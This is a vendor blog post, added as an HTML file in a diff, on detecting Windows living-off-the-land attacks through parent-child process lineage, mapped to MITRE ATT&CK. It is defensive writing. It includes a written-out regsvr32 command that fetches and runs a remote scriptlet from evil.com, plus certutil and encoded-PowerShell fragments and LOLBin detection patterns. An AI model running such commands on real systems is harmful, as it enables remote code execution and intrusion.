@@ -1,0 +1,338 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks — WinSentinel Blog</title>
+  <meta name="description" content="Your attacker didn't drop custom malware. They used PowerShell, certutil, and mshta — tools that were already on the machine. Here's how parent-child process analysis exposes living-off-the-land techniques that traditional antivirus completely misses." />
+  <meta name="theme-color" content="#0b0f17" />
+  <meta name="author" content="Saurav Bhattacharya" />
+  <meta property="og:title" content="Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks" />
+  <meta property="og:description" content="Your attacker didn't drop custom malware. They used PowerShell, certutil, and mshta — tools that were already on the machine. Here's how parent-child process analysis exposes living-off-the-land techniques that traditional antivirus completely misses." />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2026-06-07" />
+  <meta property="og:url" content="https://winsentinel.ai/blog/process-lineage-analysis" />
+  <meta property="og:image" content="https://winsentinel.ai/og/blog.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="https://winsentinel.ai/og/blog.png" />
+  <meta name="twitter:title" content="Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks" />
+  <meta name="twitter:description" content="Your attacker didn't drop custom malware. They used PowerShell, certutil, and mshta — tools that were already on the machine. Here's how parent-child process analysis exposes living-off-the-land techniques that traditional antivirus completely misses." />
+  <link rel="canonical" href="https://winsentinel.ai/blog/process-lineage-analysis" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cpath fill='%2338bdf8' d='M32 4 8 14v18c0 14 10 24 24 28 14-4 24-14 24-28V14L32 4Z'/%3E%3Cpath fill='%230b0f17' d='m28 38-7-7 3-3 4 4 11-11 3 3-14 14Z'/%3E%3C/svg%3E" />
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: {
+            mono: ['ui-monospace','SFMono-Regular','Menlo','Monaco','Consolas','monospace'],
+            sans: ['Inter','ui-sans-serif','system-ui','-apple-system','Segoe UI','Roboto','sans-serif'],
+          },
+          colors: {
+            ink: { 950: '#070a11', 900: '#0b0f17', 800: '#11161f', 700: '#1a2030' },
+          },
+        },
+      },
+    };
+  </script>
+  <style>
+    html { scroll-behavior: smooth; }
+    body { background: radial-gradient(1200px 600px at 50% -200px, #0e1a2d 0%, #070a11 60%, #070a11 100%); }
+    .prose h2 { color: #fff; font-size: 1.5rem; font-weight: 700; margin-top: 2rem; margin-bottom: 0.75rem; }
+    .prose h3 { color: #e2e8f0; font-size: 1.125rem; font-weight: 600; margin-top: 1.5rem; margin-bottom: 0.5rem; }
+    .prose p { color: #cbd5e1; line-height: 1.75; margin-bottom: 1rem; }
+    .prose code { color: #7dd3fc; background: rgba(56,189,248,.08); padding: 2px 6px; border-radius: 4px; font-size: 0.875em; }
+    .prose pre { background: #11161f; border: 1px solid rgba(255,255,255,.08); border-radius: 8px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
+    .prose pre code { background: none; padding: 0; color: #e2e8f0; }
+    .prose ul { list-style: disc; padding-left: 1.5rem; color: #cbd5e1; margin-bottom: 1rem; }
+    .prose li { margin-bottom: 0.25rem; }
+    .prose a { color: #38bdf8; text-decoration: underline; text-underline-offset: 2px; }
+    .prose a:hover { color: #7dd3fc; }
+    .prose blockquote { border-left: 3px solid #38bdf8; padding-left: 1rem; color: #94a3b8; font-style: italic; margin: 1rem 0; }
+  </style>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "@id": "https://winsentinel.ai/blog/process-lineage-analysis",
+  "headline": "Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks",
+  "datePublished": "2026-06-07",
+  "dateModified": "2026-06-07",
+  "url": "https://winsentinel.ai/blog/process-lineage-analysis",
+  "mainEntityOfPage": "https://winsentinel.ai/blog/process-lineage-analysis",
+  "description": "Your attacker didn't drop custom malware. They used PowerShell, certutil, and mshta — tools that were already on the machine. Here's how parent-child process analysis exposes living-off-the-land techniques that traditional antivirus completely misses.",
+  "author": {
+    "@type": "Person",
+    "name": "Saurav Bhattacharya"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "WinSentinel",
+    "url": "https://winsentinel.ai",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://winsentinel.ai/og/default.svg"
+    }
+  },
+  "image": "https://winsentinel.ai/og/blog.png",
+  "isPartOf": {
+    "@type": "Blog",
+    "@id": "https://winsentinel.ai/blog",
+    "name": "WinSentinel Blog"
+  }
+}
+  </script>
+</head>
+<body class="font-sans text-slate-200 antialiased">
+
+<div id="site-header"></div>
+
+<article class="max-w-3xl mx-auto px-6 pt-14 pb-20">
+  <a href="/blog" class="text-sm text-sky-400 hover:text-sky-300">← All posts</a>
+  <time class="mt-8 block text-xs text-slate-500 uppercase tracking-wider">June 7, 2026</time>
+  <h1 class="mt-2 text-3xl md:text-4xl font-bold text-white leading-tight">Process Lineage Analysis: Catching LOLBin Abuse and Living-off-the-Land Attacks</h1>
+  <p class="mt-4 text-lg text-slate-300">Your attacker didn't drop custom malware. They used PowerShell, certutil, and mshta — tools that were already on the machine. Here's how parent-child process analysis exposes living-off-the-land techniques that traditional antivirus completely misses.</p>
+
+  <div class="prose mt-8">
+    <p>The most dangerous attacks don't involve malware at all. They use the tools Windows ships with — PowerShell, certutil, mshta, rundll32, regsvr32 — to achieve their objectives. The technique is called "Living off the Land" (LOL), and the binaries used are called LOLBins (Living off the Land Binaries). MITRE ATT&CK catalogs dozens of these, and they share one critical property: antivirus won't flag them because they're legitimate, signed Microsoft executables.</p>
+
+        <p>So how do you catch an attacker using your own tools against you? You don't look at <em>what</em> is running — you look at <em>who started it</em>. That's process lineage analysis: examining the parent-child relationships between running processes to identify chains that should never exist.</p>
+
+        <h2>Why Parent-Child Relationships Matter</h2>
+
+        <p>Every process on Windows has a parent — the process that created it. When you double-click Notepad from Explorer, the chain is <code>explorer.exe → notepad.exe</code>. That's normal. When you open PowerShell from the Start menu, it's <code>explorer.exe → powershell.exe</code>. Also normal.</p>
+
+        <p>But when Microsoft Word spawns PowerShell? That's <code>winword.exe → powershell.exe</code> — a classic indicator of macro-based malware. When a browser spawns <code>cmd.exe</code>? That's <code>chrome.exe → cmd.exe</code> — possibly a drive-by compromise. When WMI spawns a command interpreter? That's lateral movement.</p>
+
+        <p>The individual processes are all legitimate. PowerShell is legitimate. Word is legitimate. The <em>relationship</em> is what's suspicious. This is the fundamental insight behind process lineage analysis: context reveals intent.</p>
+
+        <h2>The 12 Suspicious Lineage Patterns</h2>
+
+        <p>WinSentinel's Process Lineage Audit checks every running process against 12 empirically-derived rules, each mapped to a specific MITRE ATT&CK technique. Here are the most critical:</p>
+
+        <h3>Critical: Office → Script Engine</h3>
+        <p>If Word, Excel, PowerPoint, or Outlook spawns <code>cmd.exe</code>, <code>powershell.exe</code>, <code>wscript.exe</code>, <code>cscript.exe</code>, or <code>mshta.exe</code>, you almost certainly have a malicious macro executing. This maps to <strong>T1204.002 (User Execution: Malicious File)</strong> and is the #1 initial access vector for phishing attacks.</p>
+
+        <pre><code># What this looks like in process tree:
+winword.exe (PID 5832)
+  └─ cmd.exe (PID 9014)
+       └─ powershell.exe (PID 9128)
+            └─ certutil.exe (PID 9256)  ← downloading payload
+
+# This is a textbook phishing chain:
+# 1. User opens malicious .docm attachment
+# 2. Macro launches cmd.exe
+# 3. cmd spawns powershell to download staged payload
+# 4. certutil decodes/downloads the real malware</code></pre>
+
+        <h3>Critical: Browser → Script Engine</h3>
+        <p>Chrome, Edge, Firefox, or Brave spawning <code>cmd.exe</code> or <code>powershell.exe</code> indicates <strong>T1189 (Drive-by Compromise)</strong>. The user visited a malicious page that exploited a browser vulnerability to gain code execution. Unlike Office macros, the user didn't even need to open a file — they just visited a URL.</p>
+
+        <h3>Critical: Script Engine → Network Utility</h3>
+        <p>When <code>powershell.exe</code> or <code>wscript.exe</code> spawns <code>certutil</code>, <code>bitsadmin</code>, or <code>curl</code>, the attacker is retrieving a second-stage payload. This is <strong>T1105 (Ingress Tool Transfer)</strong> — the moment the attacker transitions from "I have execution" to "I'm bringing in real tools." This is your last chance to catch them before they establish persistence.</p>
+
+        <h3>Critical: WMI → Execution Engine</h3>
+        <p><code>wmiprvse.exe</code> spawning <code>cmd.exe</code>, <code>powershell.exe</code>, or <code>rundll32.exe</code> is <strong>T1047 (Windows Management Instrumentation)</strong> — one of the most reliable indicators of lateral movement. An attacker on Machine A uses WMI to execute commands on Machine B without ever establishing an interactive session. The WMI provider host (<code>wmiprvse.exe</code>) is the process that handles the execution request.</p>
+
+        <pre><code># Lateral movement via WMI:
+wmiprvse.exe (PID 1024)   ← WMI provider host
+  └─ powershell.exe (PID 4492)
+       └─ net.exe (PID 4510)  ← attacker enumerating network</code></pre>
+
+        <h3>Warning: LOLBin Proxy Execution</h3>
+        <p>Several Windows binaries can be abused to execute arbitrary code while appearing legitimate in logs:</p>
+
+        <ul>
+          <li><strong>mshta.exe</strong> — <a href="https://attack.mitre.org/techniques/T1218/005/">T1218.005</a> — Executes arbitrary HTA content including VBScript/JScript. Commonly used to bypass AppLocker rules that allow Microsoft-signed binaries.</li>
+          <li><strong>rundll32.exe</strong> — <a href="https://attack.mitre.org/techniques/T1218/011/">T1218.011</a> — Loads and executes arbitrary DLLs. Spawned from script engines or WMI, this indicates the attacker is executing malicious code through a signed proxy.</li>
+          <li><strong>regsvr32.exe</strong> — <a href="https://attack.mitre.org/techniques/T1218/010/">T1218.010</a> — Registers COM objects but can also execute remote scriptlets. <code>regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll</code> downloads and executes code without touching disk.</li>
+          <li><strong>certutil.exe</strong> — <a href="https://attack.mitre.org/techniques/T1140/">T1140</a> — Windows certificate utility that can also download files (<code>-urlcache</code>) and decode base64 payloads (<code>-decode</code>). The Swiss Army knife of LOLBins.</li>
+        </ul>
+
+        <p>When these binaries appear with suspicious parents (cmd, powershell, wscript, or WMI), WinSentinel flags them. The binary itself isn't malicious — the context of who spawned it is.</p>
+
+        <h2>Beyond Lineage: Orphaned Processes and Deep Nesting</h2>
+
+        <p>Process lineage analysis doesn't stop at parent-child rules. WinSentinel checks two additional indicators:</p>
+
+        <h3>Orphaned Processes</h3>
+        <p>An orphaned process is one whose parent process no longer exists. While some orphaning is normal (the parent finishes its work and exits), a high count of orphaned processes can indicate:</p>
+
+        <ul>
+          <li><strong>Process injection</strong> — malware injecting code into a legitimate process, then the injector exits. The injected process runs orphaned.</li>
+          <li><strong>Parent PID spoofing</strong> — a technique where malware creates a process with a fake parent PID to hide its true origin. When the "fake" parent doesn't exist, the child appears orphaned.</li>
+          <li><strong>Anti-forensics</strong> — the attacker terminates the initial exploitation chain (browser, Office, etc.) to erase the lineage evidence, leaving their persistent processes orphaned.</li>
+        </ul>
+
+        <pre><code># WinSentinel orphan detection:
+[WARNING] Orphaned Processes Detected (14)
+  Found 14 processes whose parent process no longer exists.
+  Sample: suspicious-svc (PID 8812), helper64 (PID 9102), ...
+  Review orphaned processes running from unusual locations.</code></pre>
+
+        <h3>Deep Interpreter Nesting</h3>
+        <p>Legitimate automation rarely nests more than 2 levels of command interpreters. When you see 3 or more levels of <code>cmd</code>/<code>powershell</code>/<code>wscript</code> chained together, it's usually an obfuscation technique:</p>
+
+        <pre><code># Suspicious deep nesting:
+cmd.exe
+  └─ powershell.exe -enc [base64]
+       └─ cmd.exe /c "..."
+            └─ powershell.exe -nop -w hidden -c ...
+                 └─ certutil.exe -urlcache -f ...
+
+# Each layer decodes or deobfuscates the next command.
+# The attacker is intentionally making analysis difficult.</code></pre>
+
+        <p>WinSentinel's depth analysis walks the full process tree and flags any chain with 3+ levels of nested interpreters. Each level of indirection is another barrier for incident responders — and a signal of adversary sophistication.</p>
+
+        <h2>Safe Exclusions: Reducing False Positives</h2>
+
+        <p>Not every suspicious-looking chain is an attack. WinSentinel maintains a set of known-safe parent-child combinations to minimize noise:</p>
+
+        <ul>
+          <li><code>svchost → taskhostw</code> — Normal Windows task scheduling</li>
+          <li><code>services → svchost</code> — Standard service control manager behavior</li>
+          <li><code>explorer → cmd</code> — User right-clicking "Open command window here" is extremely common and benign</li>
+        </ul>
+
+        <p>These exclusions are carefully curated. A rule is only added after confirming that the combination is consistently benign across enterprise deployments. False positive reduction is critical — if an alert fires on every machine, defenders learn to ignore it.</p>
+
+        <h2>Real-World Attack Chains WinSentinel Catches</h2>
+
+        <h3>Scenario 1: Emotet-Style Phishing</h3>
+        <pre><code>outlook.exe → winword.exe → cmd.exe → powershell.exe
+
+Triggered rules:
+  [CRITICAL] Office Application Spawning Script Engine [T1204.002]
+  [WARNING] Command Prompt Spawning PowerShell [T1059.001]
+
+The user opened an email attachment in Outlook, which launched Word
+with a .docm file containing a malicious macro. The macro spawned
+cmd.exe, which launched PowerShell to download the Emotet dropper.</code></pre>
+
+        <h3>Scenario 2: Lateral Movement via WMI</h3>
+        <pre><code>wmiprvse.exe → cmd.exe → whoami.exe
+                        → net.exe (net group "Domain Admins")
+                        → powershell.exe (Invoke-WebRequest...)
+
+Triggered rules:
+  [CRITICAL] WMI Spawning Execution Engine [T1047]
+
+Attacker on another machine used wmic to execute reconnaissance
+commands on this endpoint. WMI provider host spawning cmd and
+network enumeration tools is textbook lateral movement.</code></pre>
+
+        <h3>Scenario 3: Scheduled Task Persistence</h3>
+        <pre><code>svchost.exe (Task Scheduler) → mshta.exe → powershell.exe
+
+Triggered rules:
+  [WARNING] Scheduled Task Spawning Script Engine [T1053.005]
+  [WARNING] Potential LOLBin Abuse: mshta [T1218.005]
+
+Attacker created a scheduled task that runs mshta.exe with a URL
+pointing to a remote HTA file. mshta downloads and executes the
+script, which spawns PowerShell for the actual payload. Classic
+multi-stage persistence that survives reboots.</code></pre>
+
+        <h2>Running a Process Lineage Audit</h2>
+
+        <pre><code># Install WinSentinel:
+dotnet tool install --global WinSentinel.Cli
+
+# Run process lineage analysis:
+winsentinel --audit --modules process-lineage
+
+# Example output:
+ Process Lineage Audit
+ ──────────────────────────────────────────────────────
+ [CRITICAL] Critical Process Lineage Violations (2)
+   • outlook → powershell (PID 8412): Office Application
+     Spawning Script Engine [T1204.002]
+   • wmiprvse → cmd (PID 9018): WMI Spawning Execution
+     Engine [T1047]
+
+ [WARNING] Suspicious Process Lineage Patterns (3)
+   • svchost → mshta (PID 5512): Scheduled Task Spawning
+     Script Engine [T1053.005]
+   • cmd → rundll32 (PID 6230): Potential LOLBin Abuse:
+     rundll32 [T1218.011]
+   • powershell → certutil (PID 7128): Potential LOLBin
+     Abuse: certutil [T1140]
+
+ [PASS] No Orphaned Processes
+ [PASS] No Deep Interpreter Nesting</code></pre>
+
+        <p>Each finding includes the full MITRE ATT&CK technique ID, the parent and child process names with PIDs, and remediation guidance including the PowerShell commands needed to terminate the suspicious chain.</p>
+
+        <h2>Process Lineage vs. Traditional Detection</h2>
+
+        <p>Here's why process lineage analysis catches what traditional tools miss:</p>
+
+        <ul>
+          <li><strong>Antivirus</strong> — checks file signatures and behavioral patterns of individual processes. When <code>powershell.exe</code> runs, AV sees a signed Microsoft binary. The command might be flagged by AMSI, but the process itself passes inspection. Lineage analysis sees that PowerShell was spawned by Word — something AV doesn't consider.</li>
+          <li><strong>EDR</strong> — most EDR tools do perform lineage analysis, but they require cloud infrastructure, continuous connectivity, and significant tuning. WinSentinel does it locally in a single scan with zero external dependencies.</li>
+          <li><strong>Sysmon</strong> — the gold standard for process creation logging, but it's a data source, not an analyzer. Sysmon logs the events; someone (or something) still needs to analyze the parent-child relationships. WinSentinel does the analysis automatically.</li>
+          <li><strong>AppLocker/WDAC</strong> — blocks unauthorized binaries from running, but LOLBins are authorized Microsoft binaries. You can't block <code>powershell.exe</code> without breaking half your IT automation. Lineage analysis catches the abuse pattern instead of blocking the tool entirely.</li>
+        </ul>
+
+        <h2>From Detection to Prevention</h2>
+
+        <p>Process lineage analysis is primarily a detection tool — it catches attacks in progress or after the fact. But the findings drive preventive action:</p>
+
+        <ul>
+          <li><strong>Office macro hardening</strong> — If you see Office → Script Engine chains, enforce macro execution policies. Block macros from the internet entirely (Group Policy → Trust Center settings). Most organizations that do this eliminate 80% of their phishing-based initial access risk.</li>
+          <li><strong>PowerShell Constrained Language Mode</strong> — Restricts PowerShell to a subset of functionality that prevents most attack techniques while preserving administrative scripting. Combined with Script Block Logging, this makes PowerShell-based attacks both harder and more visible.</li>
+          <li><strong>AppLocker with script rules</strong> — While you can't block LOLBins outright, you can restrict which directories they're allowed to execute from and which parent processes can launch them.</li>
+          <li><strong>WMI subscription auditing</strong> — If WMI-based lateral movement appears in lineage analysis, enable WMI event subscription auditing and restrict WMI access to authorized management tools.</li>
+        </ul>
+
+        <h2>Fleet-Wide Lineage Monitoring</h2>
+
+        <p>On a single machine, a process lineage audit gives you a point-in-time snapshot. Across a fleet, it gives you a threat detection capability. With WinSentinel Pro, every agent-equipped machine runs continuous lineage analysis and reports suspicious chains to the central dashboard:</p>
+
+        <pre><code># Fleet-wide process lineage summary (Pro):
+winsentinel fleet status --filter process-lineage
+
+Fleet Lineage Analysis (87 nodes reporting)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Critical chains:  3 across 2 nodes
+Warning chains:  12 across 8 nodes
+Orphaned procs:   2 nodes with high orphan counts
+Deep nesting:     0 nodes flagged
+
+Active Threats:
+  DESKTOP-8XK2: outlook → cmd → powershell [T1204.002]
+    First seen: 2026-06-07 09:14:22 UTC
+    Action: Isolate endpoint, initiate IR
+
+  SERVER-DB01: wmiprvse → cmd → whoami [T1047]
+    First seen: 2026-06-07 11:02:15 UTC
+    Action: Investigate lateral movement source</code></pre>
+
+        <p>The fleet view transforms process lineage from "single machine forensics" into "enterprise threat detection." When the same suspicious pattern appears on multiple machines simultaneously, you're looking at an active intrusion — and you know exactly which machines are affected.</p>
+
+        <h2>Getting Started</h2>
+
+        <p>Run a process lineage audit right now:</p>
+
+        <pre><code>dotnet tool install --global WinSentinel.Cli
+winsentinel --audit --modules process-lineage</code></pre>
+
+        <p>Every finding includes the MITRE ATT&CK technique ID, full parent-child chain, and actionable remediation steps. The free tier gives you complete process lineage analysis on any Windows machine — no agents, no cloud, no license required.</p>
+
+        <p>Your attacker already knows which LOLBins are on your machine. The question is whether you know how they're being used. Process lineage analysis turns Windows' built-in tools from a liability into a detection surface. For fleet-wide continuous monitoring with automated alerting, see <a href="/pricing">WinSentinel Pro</a>.</p>
+  </div>
+
+  <nav class="mt-16 pt-8 border-t border-white/10 flex items-center justify-between gap-6 text-sm text-slate-400">
+    <a href="/blog/event-log-forensics" class="hover:text-white">← Windows Event Log Forensics: Building Detection Rules That Actually Work</a>
+    <a href="/blog/event-log-hardening" class="hover:text-white text-right">Event Log Hardening: The Forensic Trail Attackers Hope You Never Configure →</a>
+  </nav>
+</article>
+
+<div id="site-footer"></div>
+<script src="/components/nav.js"></script>
+</body>
+</html>
